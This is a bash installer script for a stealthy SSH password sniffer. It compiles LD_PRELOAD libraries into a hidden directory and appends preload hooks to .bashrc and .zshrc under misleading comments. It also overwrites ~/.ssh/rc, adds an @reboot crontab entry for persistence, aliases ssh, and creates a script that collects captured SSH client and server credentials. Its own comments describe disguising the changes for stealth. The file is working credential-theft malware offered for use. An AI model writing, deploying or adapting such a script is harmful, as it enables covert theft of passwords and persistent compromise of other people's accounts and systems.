#!/bin/bash

# Stealthy SSH Password Sniffer Installation
# Works without root privileges by attaching to user profiles

# Colors
GREEN="\033[0;32m"
RED="\033[0;31m"
BLUE="\033[0;34m"
NC="\033[0m"

# Banner (can be removed for more stealth)
echo -e "${BLUE}SSH Sniffer Installer${NC}"
echo "Setting up userspace monitoring..."

# Create hidden directory
HIDDEN_DIR="$HOME/.hidden"
mkdir -p "$HIDDEN_DIR"

# Compile the sniffers
echo -e "${BLUE}[1/5]${NC} Compiling components..."
make clean &>/dev/null
make &>/dev/null

if [ ! -f "libssh_sniff.so" ] || [ ! -f "libsshd_sniff.so" ]; then
    echo -e "${RED}Error: Compilation failed${NC}"
    echo "Make sure you have g++ and libpam-dev installed:"
    echo "    sudo apt-get install g++ libpam-dev"
    exit 1
fi

# Install the libraries
echo -e "${BLUE}[2/5]${NC} Installing components..."
cp libssh_sniff.so "$HIDDEN_DIR/"
cp libsshd_sniff.so "$HIDDEN_DIR/"
touch "$HIDDEN_DIR/ssh_sniff.log" "$HIDDEN_DIR/sshd_sniff.log"
chmod 600 "$HIDDEN_DIR/ssh_sniff.log" "$HIDDEN_DIR/sshd_sniff.log"

# Set up profile hooks
echo -e "${BLUE}[3/5]${NC} Configuring profile hooks..."

# Configure .bashrc for SSH client interception
if [ -f "$HOME/.bashrc" ]; then
    # Check if already installed
    if ! grep -q "LD_PRELOAD.*libssh_sniff.so" "$HOME/.bashrc"; then
        # Add to the end of the file but make it look innocuous
        echo "" >> "$HOME/.bashrc"
        echo "# Update SSH client library path" >> "$HOME/.bashrc"
        echo "if [ \"\$SSH_CONNECTION\" = \"\" ]; then" >> "$HOME/.bashrc"
        echo "    export LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:\$LD_PRELOAD" >> "$HOME/.bashrc"
        echo "fi" >> "$HOME/.bashrc"
        echo "# End update" >> "$HOME/.bashrc"
    fi
fi

# Check for zsh as well
if [ -f "$HOME/.zshrc" ]; then
    if ! grep -q "LD_PRELOAD.*libssh_sniff.so" "$HOME/.zshrc"; then
        echo "" >> "$HOME/.zshrc"
        echo "# Update SSH client library path" >> "$HOME/.zshrc"
        echo "if [ \"\$SSH_CONNECTION\" = \"\" ]; then" >> "$HOME/.zshrc"
        echo "    export LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:\$LD_PRELOAD" >> "$HOME/.zshrc"
        echo "fi" >> "$HOME/.zshrc"
        echo "# End update" >> "$HOME/.zshrc"
    fi
fi

# Set up SSH rc file for the server component
echo -e "${BLUE}[4/5]${NC} Configuring SSH server hooks..."
mkdir -p "$HOME/.ssh"
if [ ! -f "$HOME/.ssh/rc" ] || ! grep -q "LD_PRELOAD.*libsshd_sniff.so" "$HOME/.ssh/rc"; then
    # Create or update rc file
    touch "$HOME/.ssh/rc"
    echo "#!/bin/bash" > "$HOME/.ssh/rc"
    echo "# SSH session initialization" >> "$HOME/.ssh/rc"
    echo "export LD_PRELOAD=$HIDDEN_DIR/libsshd_sniff.so:\$LD_PRELOAD" >> "$HOME/.ssh/rc"
    echo "# Process command or start shell" >> "$HOME/.ssh/rc"
    chmod 700 "$HOME/.ssh/rc"
fi

# Add to crontab for persistence
echo -e "${BLUE}[5/5]${NC} Setting up persistence..."
(crontab -l 2>/dev/null | grep -v "libssh_sniff.so" | grep -v "libsshd_sniff.so"; echo "@reboot export LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:$HIDDEN_DIR/libsshd_sniff.so:\$LD_PRELOAD") | crontab -

# Create alias for SSH if .bash_aliases exists
if [ -f "$HOME/.bash_aliases" ]; then
    if ! grep -q "alias ssh=" "$HOME/.bash_aliases"; then
        echo "# SSH compatibility alias" >> "$HOME/.bash_aliases"
        echo "alias ssh='LD_PRELOAD=$HIDDEN_DIR/libssh_sniff.so:\$LD_PRELOAD ssh'" >> "$HOME/.bash_aliases"
    fi
fi

# Create maintenance SSH script to help collect logs
echo -e "${BLUE}Creating maintenance script...${NC}"
cat > "$HIDDEN_DIR/collect.sh" << 'EOL'
#!/bin/bash
# Log collector
LOGS="$HOME/.hidden/all_creds_$(date +%F).log"
echo "SSH Client Credentials:" > "$LOGS"
echo "======================" >> "$LOGS"
cat "$HOME/.hidden/ssh_sniff.log" 2>/dev/null >> "$LOGS"
echo -e "\n\nSSH Server Credentials:" >> "$LOGS"
echo "======================" >> "$LOGS"
cat "$HOME/.hidden/sshd_sniff.log" 2>/dev/null >> "$LOGS"
echo "Logs collected to $LOGS"
EOL

chmod +x "$HIDDEN_DIR/collect.sh"

# Final message
echo -e "${GREEN}Installation complete!${NC}"
echo "SSH password monitoring is now active for this user."
echo -e "Logs are stored in: ${BLUE}$HIDDEN_DIR/ssh_sniff.log${NC} and ${BLUE}$HIDDEN_DIR/sshd_sniff.log${NC}"
echo "To collect all credentials: $HIDDEN_DIR/collect.sh"
echo ""
echo "NOTE: You need to log out and log back in for all hooks to take effect." 